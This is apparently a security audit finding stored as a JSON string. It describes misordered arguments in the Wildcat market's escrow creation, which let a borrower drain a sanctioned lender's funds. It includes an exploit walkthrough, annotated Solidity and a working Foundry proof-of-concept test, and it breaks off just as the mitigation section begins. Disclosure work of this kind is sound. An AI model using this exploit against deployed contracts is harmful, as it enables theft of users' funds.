        "gtraw": "\n# Vulnerability details\n\n## Impact\n\nThe `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation Steps\n\n1.
